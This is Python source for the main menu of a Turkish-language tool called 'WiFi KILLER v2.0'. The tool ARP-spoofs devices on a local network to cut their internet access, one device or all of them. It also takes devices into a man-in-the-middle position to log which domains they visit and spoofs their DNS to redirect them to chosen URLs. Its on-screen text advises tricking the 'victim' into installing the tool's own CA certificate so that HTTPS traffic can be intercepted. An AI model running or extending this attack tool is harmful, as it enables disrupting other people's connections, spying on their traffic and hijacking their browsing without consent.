import ctypes
import os
import sys
import time
from urllib.parse import urlparse

from scanner import PORT_SERVICES, classify_device, scan_network
from spoofer import ArpKiller, check_environment, gateway_route, is_admin, test_kill, warn_if_no_root
from monitor import TrafficMonitor, guess_identity_from_domains, sniff_device_domains
from redirector import (
    DnsRedirector,
    PageServer,
    force_forwarding_off,
    set_forwarding,
)

SCRIPT = f'"{os.path.abspath(sys.argv[0])}"'

killed = {}
redirected = {}
page_server = None
last_devices = []
traffic_monitor = None
monitor_scope = []
monitor_passthrough = False


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def print_header():
    print("=" * 50)
    print("              WiFi KILLER v2.0")
    print("=" * 50)
    print("  1) Agi tara ve cihazlari listele")
    print("  2) Cihazin internetini kes (kick)")
    print(" 10) TUM cihazlarin internetini kes")
    print("  3) Kesilen cihazi geri bagla")
    print("  4) Tum kesilenleri geri bagla")
    print("  5) Kesilen cihazlari goster")
    print("  6) Kesinti testi yap (kanitla)")
    print("  7) Cihaz detaylarini goster (port/uretici)")
    print("  8) Cihazi URL'ye yonlendir (DNS spoof)")
    print("  9) Yonlendirmeyi durdur")
    print(" 11) Trafik izleme (kim hangi sitede)")
    print("  0) Cikis (tum cihazlari geri baglar)")
    print("=" * 50)
    if killed:
        aktifler = ", ".join(killed.keys())
        print(f" [AKTIF KESINTILER]: {aktifler}")
    if redirected:
        yonlenenler = ", ".join(redirected.keys())
        print(f" [YONLENDIRME]: {yonlenenler}")
    print()


def ensure_admin():
    if is_admin():
        return
    if os.name != "nt":
        print("[!] Root bulunamadi - SADECE pasif mod calisir (tara/izle).")
        print("    ARP spoofing islemleri icin root gerekir:  su -c 'python main.py'")
        return
    print("[!] Bu program ARP paketleri gostermek icin yonetici yetkisi gerektiriyor.")
    answer = input("    UAC ile yonetici olarak yeniden baslatilsin mi? [E/h]: ").strip().lower()
    if answer in ("e", "evet", "y", ""):
        params = " ".join(f'"{a}"' for a in sys.argv[1:])
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f"{SCRIPT} {params}".strip(), None, 1
        )
        if ret > 32:
            sys.exit(0)
        print("[!] Yonetici olarak baslatilamadi.")
        sys.exit(1)
    sys.exit(0)


def do_scan():
    global last_devices
    print("\nAg taraniyor, bu birkac saniye surebilir...\n")
    info, last_devices = scan_network()
    local_ip = info["local_ip"]
    network = ".".join(local_ip.split(".")[:3]) + ".0"

    print(f"Yerel IP : {local_ip}")
    print(f"Modem/Gateway: {network}/1 (varsayilan)")
    print(f"Bulunan  : {len(last_devices)} cihaz\n")

    headers = ("No", "IP Adresi", "Tur", "OS", "MAC Adresi", "Uretici", "Hostname")
    rows = [
        (
            str(i + 1),
            d.ip,
            d.dev_type,
            d.os_guess or "-",
            d.mac_display,
            (d.vendor[:20] or "-") if d.vendor else "-",
            d.hostname or "-",
        )
        for i, d in enumerate(last_devices)
    ]

    widths = [
        max(len(headers[i]), *(len(r[i]) for r in rows)) if rows else len(headers[i])
        for i in range(len(headers))
    ]
    line_fmt = "  ".join(headers[i].ljust(widths[i]) for i in range(len(headers)))
    print(line_fmt)
    print("-" * len(line_fmt))
    for row in rows:
        print("  ".join(cell.ljust(widths[i]) for i, cell in enumerate(row)))
    print()


def pick_device(prompt: str):
    if not last_devices:
        print("\n[!] Once agi tarayin (secenek 1).\n")
        return None
    raw = input(prompt).strip()
    try:
        idx = int(raw) - 1
        if 0 <= idx < len(last_devices):
            return last_devices[idx]
        raise IndexError
    except ValueError:
        print("\n[!] Gecersiz giris.\n")
        return None
    except IndexError:
        print("\n[!] Boyle bir numara yok.\n")
        return None


def do_device_detail():
    device = pick_device("Detayini gormek istediginiz cihazin numarasi: ")
    if not device:
        return

    print()
    print("-" * 46)
    print(f"  IP Adresi   : {device.ip}")
    print(f"  MAC Adresi  : {device.mac_display}")
    print(f"  Uretici     : {device.vendor or '(rastgele MAC / bilinmiyor)'}")
    print(f"  Tur (tahmin): {device.dev_type}")
    print(f"  OS (tahmin) : {device.os_guess or 'bilinmiyor'}")
    print(f"  TTL         : {device.ttl if device.ttl is not None else '-'}")
    print(f"  Hostname    : {device.hostname or '-'}")
    print(f"  Durum       : {'aktif' if device.alive else 'pasif'}")

    if device.open_ports:
        print("  Acik Portlar:")
        for port in device.open_ports:
            print(f"    {port:<6} {PORT_SERVICES.get(port, '?')}")
    else:
        print("  Acik Portlar: yok / taranmadi")

    print("-" * 46)

    if device.dev_type.startswith("?") or "Linux tabanli" in device.dev_type or "Bilinmiyor" in device.os_guess:
        answer = (
            input("\n[?] Kimligi netlestirmek icin 15 sn trafigi dinlensin mi? [Evet/h]: ")
            .strip()
            .lower()
        )
        if answer not in ("h", "hayir", "n"):
            identify_by_traffic(device)
    print()


def identify_by_traffic(device):
    """Cihazi kisa sureli MITM'e alip trafik izinden kimligini cikarir."""
    if os.name != "nt" and not warn_if_no_root():
        return
    _, my_ip, _ = gateway_route()
    iface, _, _ = gateway_route()

    killer = killed.get(device.ip) or ArpKiller(device.ip, device.mac)
    if not killer.ready:
        print("[!] Cihaz MITM'e alinamadi (MAC cozumlenemedi).")
        return
    if device.ip not in killed:
        try:
            killer.start()
            killed[device.ip] = killer
        except Exception as exc:
            print(f"[!] MITM baslatilamadi: {exc}")
            return

    set_forwarding(True)
    print("[i] 15 saniye dinleniyor... (telefonu biraz kullanirsan daha net olur)")
    counts = sniff_device_domains(iface, device.ip, seconds=15)

    domains = list(counts.keys())
    hint = guess_identity_from_domains(domains)

    if domains:
        preview = sorted(domains, key=lambda d: -counts[d])[:5]
        print("[i] Yakalanan baskalic domainler:")
        for dom in preview:
            print(f"      {dom}")
    else:
        print("[!] Trafik yakalanamadi (cihaz sessiz olabilir).")

    if hint == "android-xiaomi":
        device.dev_type = "Telefon (Android/Xiaomi)"
        device.os_guess = "Android (trafik izinden)"
    elif hint == "android-muhtemel":
        device.dev_type = "Telefon (Android?)"
        device.os_guess = "Android (trafik izinden)"
    elif hint == "apple":
        device.dev_type = "Apple cihazi"
        device.os_guess = "iOS/macOS (trafik izinden)"
    elif hint == "tv":
        device.dev_type = "Akilli TV"
        device.os_guess = "TV (trafik izinden)"

    print()
    print("-" * 46)
    print(f"  IP Adresi   : {device.ip}")
    print(f"  MAC Adresi  : {device.mac_display}")
    print(f"  Tur         : {device.dev_type}")
    print(f"  OS          : {device.os_guess or 'belirlenemedi'}")
    print("-" * 46)


def do_kick():
    if os.name != "nt" and not warn_if_no_root():
        return
    device = pick_device("Kesilecek cihazin numarasi: ")
    if not device:
        return
    if device.ip == get_local_ip_safe():
        print("\n[x] Kendi cihazinizi kesemezsiniz!\n")
        return

    killer = ArpKiller(device.ip, device.mac)
    if not killer.ready:
        print(
            f"\n[x] {device.ip} icin MAC cozumlenemedi "
            f"(hedef MAC={killer.target_mac or '?'}, gateway MAC={killer.gateway_mac or '?'})."
        )
        print("    Cihaz su an kapali/ulasilamaz olabilir. Once tarama yapip tekrar deneyin.\n")
        return

    try:
        killer.start()
    except Exception as exc:
        print(f"\n[x] Kick baslatilamadi: {exc}\n")
        return

    killed[device.ip] = killer
    apply_forwarding_mode()
    print(f"\n[OK] {device.ip} ({killer.target_mac}) icin ARP spoofing BASLADI.")
    print("     Cihazin interneti kesildi. Baglantiyi geri acmak icin secenek 3 veya 4.\n")


def do_kick_all():
    if os.name != "nt" and not warn_if_no_root():
        return
    if not last_devices:
        print("\n[!] Once agi tarayin (secenek 1).\n")
        return

    my_ip = get_local_ip_safe()
    _, _, gateway_ip = gateway_route()

    started = []
    failed = []
    skipped_gw = False
    skipped_self = False

    for device in last_devices:
        if device.ip == gateway_ip:
            skipped_gw = True
            continue
        if device.ip == my_ip:
            skipped_self = True
            continue
        if device.ip in killed:
            continue

        killer = ArpKiller(device.ip, device.mac)
        if not killer.ready:
            failed.append(f"{device.ip} (MAC yok)")
            continue
        try:
            killer.start()
        except Exception as exc:
            failed.append(f"{device.ip} ({exc})")
            continue

        killed[device.ip] = killer
        started.append(device.ip)

    apply_forwarding_mode()

    print(f"\n[OK] {len(started)} cihaz kesildi:")
    if started:
        for ip in started:
            print(f"     - {ip}")
    if skipped_gw:
        print(f"[i] Modem ({gateway_ip}) atlandi - onu da kessek kendi internetimiz de giderdi.")
    if skipped_self:
        print("[i] Kendi bilgisayarin atlandi.")
    if failed:
        print(f"[!] Baslatilamayan {len(failed)} cihaz: {', '.join(failed)}")
    print("     Hepsini geri baglamak icin secenek 4.\n")


def do_restore_one():
    if not killed:
        print("\n[!] Kesilmis cihaz yok.\n")
        return
    ips = list(killed.keys())
    print("\nKesilen cihazlar:")
    for i, ip in enumerate(ips, 1):
        k = killed[ip]
        sure = int(time.time() - k.started_at) if k.started_at else 0
        print(f"  {i}) {ip}  ({sure} sn once kesildi)")

    raw = input("Geri baglanacak cihazin numarasi (hepsi icin Enter): ").strip()
    if raw == "":
        targets = ips
    else:
        try:
            targets = [ips[int(raw) - 1]]
        except (ValueError, IndexError):
            print("\n[!] Gecersiz giris.\n")
            return

    for ip in targets:
        killer = killed.pop(ip)
        killer.stop(restore=True)
        if ip in redirected:
            redirected.pop(ip).stop()
            print(f"[OK] {ip} yonlendirmesi de durduruldu.")
        print(f"[OK] {ip} geri baglandi (ARP tablolari onarildi).")
    print()


def do_restore_all():
    global page_server
    if not killed and not redirected:
        print("\n[!] Kesilmis cihaz yok.\n")
        return
    for ip, killer in list(killed.items()):
        killer.stop(restore=True)
        killed.pop(ip)
        print(f"[OK] {ip} geri baglandi.")
    cleanup_redirect_state()
    print("[OK] Yonlendirme bilesenleri kapatildi.")
    print()


def do_show_killed():
    if not killed:
        print("\n[!] Su anda kesilmis cihaz yok.\n")
        return
    print("\n--- AKTIF KESINTILER ---")
    for ip, k in killed.items():
        sure = int(time.time() - k.started_at) if k.started_at else 0
        print(f"  {ip:<15} MAC: {k.target_mac}   sure: {sure}s")
    print()


def do_test_kill():
    if os.name != "nt" and not warn_if_no_root():
        return
    if not killed:
        print("\n[!] Test edilecek kesinti yok. Once secenek 2 ile bir cihazi kesin.\n")
        return
    ips = list(killed.keys())
    print("\nKesilen cihazlar:")
    for i, ip in enumerate(ips, 1):
        print(f"  {i}) {ip}")

    raw = input("Test edilecek cihazin numarasi: ").strip()
    try:
        ip = ips[int(raw) - 1]
    except (ValueError, IndexError):
        print("\n[!] Gecersiz giris.\n")
        return

    print(
        f"\n{ip} icin {test_kill.__defaults__[0]} saniye dinlenecek."
        " Bu sirada cihazda trafik uretin (YouTube ac, sayfa yenile...).\n"
    )
    result = test_kill(ip)

    if not result["lan_alive"]:
        print("[SONUC] Cihaz yerel agda gorunmuyor (kapali/WiFi'dan cikmis olabilir).")
        print("        Kesintiyi dogrulamak icin cihazi acip tekrar test edin.\n")
    elif result["intercepted"]:
        print(f"[SONUC] KESINTI DOGRULANDI - {result['packet_count']} internet paketi")
        print("        senin makineni geciyor ve olduruluyor. Cihaz internette")
        print("        hicbir yere ulasamiyor. Ek kanit: cihazda tarayici acin,")
        print("        hicbir site acilmayacak.\n")
    else:
        print("[SONUC] BELIRSIZ - dinleme suresince hedefin internet paketleri")
        print("        bize ulasmadi. Iki ihtimal var:")
        print("        a) Cihaz su an trafik uretmiyor -> cihazda YouTube/sayfa")
        print("           acip bu testi TEKRAR calistirin (secenek 6)")
        print("        b) Spoofing tutmamis -> secenek 5 ile durumu kontrol edin\n")


def do_redirect():
    global page_server
    if os.name != "nt" and not warn_if_no_root():
        return
    if not killed:
        print("\n[!] Once secenek 2 ile bir cihazi kesmelisiniz (yonlendirme,")
        print("    ARP spoofing uzerinden calisir).\n")
        return
    ips = list(killed.keys())
    print("\nKesilen cihazlar:")
    for i, ip in enumerate(ips, 1):
        print(f"  {i}) {ip}")

    raw = input("Yonlendirilecek cihazin numarasi: ").strip()
    try:
        ip = ips[int(raw) - 1]
    except (ValueError, IndexError):
        print("\n[!] Gecersiz giris.\n")
        return

    my_ip = get_local_ip_safe()
    print()
    print("Hedef: tam URL (orn. https://x.com/kullanici) veya IP")
    print(f"       Bos birakirsan -> bu bilgisayardaki karsilama sayfasi ({my_ip})")
    target = input("  > ").strip() or my_ip

    is_url = target.lower().startswith(("http://", "https://"))
    passthrough_domains = None
    domain_filter = None
    redirect_url = None
    message = ""

    if is_url:
        host = urlparse(target).netloc.split(":")[0].lower()
        passthrough_domains = [host]
        if host == "x.com" or host.endswith(".x.com") or "twitter.com" in host:
            passthrough_domains += ["twimg.com", "t.co"]
        redirect_url = target

        if not set_forwarding(True):
            print("\n[x] Paket yonlendirme acilamadi; URL modu icin gerekli.")
            print("    Yonetici olarak calistigindan emin ol.\n")
            return
        print("[OK] Paket yonlendirme acildi - cihazin interneti acik kalacak.")
    else:
        message = input("Sayfada gorunecek mesaj (bos = varsayilan): ").strip()
        domains_raw = input(
            "Sadece belirli domainler mi? (virgulle ayirin, bos = tum siteler): "
        ).strip()
        domain_filter = [d.strip() for d in domains_raw.split(",") if d.strip()] or None

    if ip not in redirected:
        wanted_redirect = redirect_url or None
        wanted_message = message or None
        if page_server is not None and (
            page_server.redirect_url != wanted_redirect
            or page_server.message != wanted_message
        ):
            page_server.stop()
            page_server = None
        if page_server is None:
            try:
                page_server = PageServer(
                    message=wanted_message,
                    redirect_url=wanted_redirect,
                    host_ip=my_ip,
                )
                PageServer.open_firewall()
                page_server.start()
            except OSError as exc:
                print(f"\n[x] Web sunucusu baslatilamadi (port 80): {exc}\n")
                return

        dns_redir = DnsRedirector(
            ip,
            redirect_ip=my_ip,
            domains=domain_filter,
            passthrough_domains=passthrough_domains,
        )
        dns_redir.start()
        redirected[ip] = dns_redir

        print(f"\n[OK] {ip} icin DNS yonlendirme BASLADI.")
        if is_url:
            print(f"     Cihaz herhangi bir site acmak istediginde -> {target}")
            print("     Not: Cihazin interneti KAPALI DEGIL, trafigi senin uzerinden akiyor.")
        else:
            print(f"     Tum HTTP istekleri -> {my_ip} (port 80)")
            if domain_filter:
                print(f"     Kapsam: {', '.join(domain_filter)}")
            else:
                print("     Kapsam: TUM domainler")
        print()
        print(" Sinirlar:")
        print(" - Tarayici once https'i dener; CA YUKLU DEGILSE sertifika")
        print("   uyarisinda 'Gelismis > Devam et' denebilen siteler 302'ye gider.")
        print(" - HSTS'li sitelerde (Google/YouTube/X/Instagram) uyari cikmaz,")
        print("   yonlendirme SADECE kurban CA'yı yuklerse calisir.")
        print(f" - Kurbana soyle: tarayicidan  http://{my_ip}/ca  acip 'WiFiKiller CA'")
        print("   sertifikasini yuklesin; sonra tum HTTPS (HSTS dahil) uyarisiz yonlenir.")
        print(" - Guvenilir tetikleyici: http:// ile baslayan adresler (CA'siz da calisir)")
        print(" - Ipucu: Android 'Agda oturum acin' bildirimi de hedefe goturur")
        print(" - Firefox 'DNS over HTTPS' aciksa bypass edilebilir")
        print()


def apply_forwarding_mode():
    """URL yonlendirme veya izleme aktifken forwarding ACIK, degilse KAPALI olmali."""
    set_forwarding(bool(redirected) or monitor_passthrough)


def cleanup_redirect_state():
    global page_server
    for ip in list(redirected.keys()):
        redirected.pop(ip).stop()
    if page_server is not None:
        page_server.stop()
        page_server = None
    set_forwarding(False)


def do_stop_redirect():
    global page_server
    if not redirected:
        print("\n[!] Aktif yonlendirme yok.\n")
        return
    ips = list(redirected.keys())
    print("\nAktif yonlendirmeler:")
    if page_server is not None:
        print(f"  [sunucu] {page_server.request_count} HTTP(S) istegi karsilandirildi")
    for i, ip in enumerate(ips, 1):
        r = redirected[ip]
        tops = ", ".join(f"{d}({c})" for d, c in r.top_domains(4))
        print(f"  {i}) {ip}  ({r.hits} sorgu yakalandi, son: {r.last_domain or '-'})")
        if tops:
            print(f"     en cok: {tops}")

    raw = input("Durdurulacak numara (hepsi icin Enter): ").strip()
    targets = ips if raw == "" else None
    if targets is None:
        try:
            targets = [ips[int(raw) - 1]]
        except (ValueError, IndexError):
            print("\n[!] Gecersiz giris.\n")
            return

    for ip in targets:
        redir = redirected.pop(ip)
        redir.stop()
        print(f"[OK] {ip} yonlendirmesi durduruldu.")

    if not redirected:
        cleanup_redirect_state()
        print("[OK] Tum yonlendirme bilesenleri kapatildi.")
    print()


def get_local_ip_safe():
    try:
        import socket as _socket

        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ""


def ensure_mitm_for(ips):
    """Izlenecek cihazlar icin ARP spoofing'in aktif olmasini saglar."""
    ensured = 0
    for device in last_devices:
        if device.ip not in ips or device.ip in killed:
            continue
        killer = ArpKiller(device.ip, device.mac)
        if not killer.ready:
            continue
        try:
            killer.start()
        except Exception:
            continue
        killed[device.ip] = killer
        ensured += 1
    return ensured


def do_monitor():
    global traffic_monitor, monitor_scope, monitor_passthrough
    if os.name != "nt" and not warn_if_no_root():
        return
    if not last_devices:
        print("\n[!] Once agi tarayin (secenek 1).\n")
        return

    _, my_ip, gw_ip = gateway_route()

    print("\nIzleme kapsami:")
    print("  1) Tek cihaz")
    print("  2) Kesili cihazlar")
    print("  3) Tum ag (modem ve ben haric)")
    sel = input("Secim [3]: ").strip() or "3"

    if sel == "1":
        device = pick_device("Izlenecek cihazin numarasi: ")
        if not device:
            return
        scope = [device.ip]
    elif sel == "2":
        scope = list(killed.keys())
        if not scope:
            print("\n[!] Kesili cihaz yok.\n")
            return
    else:
        scope = [d.ip for d in last_devices if d.ip not in (my_ip, gw_ip)]

    missing = [ip for ip in scope if ip not in killed]
    if missing:
        print(f"[i] {len(missing)} cihaz trafigi gormek icin MITM'e aliniyor...")
    ensure_mitm_for(scope)
    still_missing = [ip for ip in scope if ip not in killed]
    scope = [ip for ip in scope if ip in killed]
    if still_missing:
        print(f"[!] MAC cozumlenemeyen {len(still_missing)} cihaz izlenemiyor: {', '.join(still_missing)}")

    observe = (
        input("Internetleri acik kalsin mi? [Evet/h]: ").strip().lower()
        not in ("h", "hayir", "n")
    )
    set_forwarding(observe)
    if observe:
        print("[OK] Izleme modu: internetler ACIK, trafik senin uzerinden akiyor.")
    else:
        print("[OK] Izleme modu: internetler KAPALI, sadece denemeler izlenecek.")

    iface, _, _ = gateway_route()
    if traffic_monitor is None:
        traffic_monitor = TrafficMonitor(iface, my_ip)
    monitor_scope = scope
    traffic_monitor.set_scope(set(scope))
    traffic_monitor.reset_stats()
    if not traffic_monitor.running:
        traffic_monitor.start()

    last_seq = traffic_monitor.seq
    print("\n--- CANLI IZLEME (donmek/durmak icin Ctrl+C) ---\n")
    try:
        while True:
            time.sleep(0.7)
            new_events, last_seq = traffic_monitor.events_after(last_seq)
            for _, ts, ip, domain, kind in new_events:
                clock = time.strftime("%H:%M:%S", time.localtime(ts))
                print(f" [{clock}] {ip:<15} -> {domain}   ({kind})")
    except KeyboardInterrupt:
        pass

    print("\n--- OZET ---")
    print(traffic_monitor.summary(scope=monitor_scope))

    traffic_monitor.stop()
    monitor_passthrough = False
    apply_forwarding_mode()
    print("\n[I] Izleme bitti.\n")


def main():
    clear_screen()
    print("WiFi Killer baslatiliyor...\n")

    problems = check_environment()
    if problems:
        for p in problems:
            print(f"[X] {p}")
        print("\nProgram kapatiliyor. Yukaridaki sorunlari giderin.")
        input("Cikmak icin Enter...")
        sys.exit(1)

    ensure_admin()

    print("[i] Onceki oturum kalintisi temizleniyor...")
    force_forwarding_off()

    while True:
        print_header()
        choice = input("Seciminiz: ").strip()

        try:
            if choice == "1":
                do_scan()
            elif choice == "2":
                do_kick()
            elif choice == "10":
                do_kick_all()
            elif choice == "3":
                do_restore_one()
            elif choice == "4":
                do_restore_all()
            elif choice == "5":
                do_show_killed()
            elif choice == "6":
                do_test_kill()
            elif choice == "7":
                do_device_detail()
            elif choice == "8":
                do_redirect()
            elif choice == "9":
                do_stop_redirect()
            elif choice == "11":
                do_monitor()
            elif choice == "0":
                if killed:
                    print("\nKesilen cihazlar geri baglaniyor...")
                    do_restore_all()
                print("Gule gule!")
                break
            elif choice.lower() in ("q", "exit", "cik"):
                if killed:
                    print("\nKesilen cihazlar geri baglaniyor...")
                    do_restore_all()
                print("Gule gule!")
                break
            else:
                print("\n[!] Gecersiz secenek.\n")
        except KeyboardInterrupt:
            print()
            continue


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if traffic_monitor is not None and traffic_monitor.running:
            traffic_monitor.stop()
        if killed:
            print("\n\nCtrl+C algilandi - tum cihazlar geri baglaniyor...")
            do_restore_all()
        print("Cikildi.")
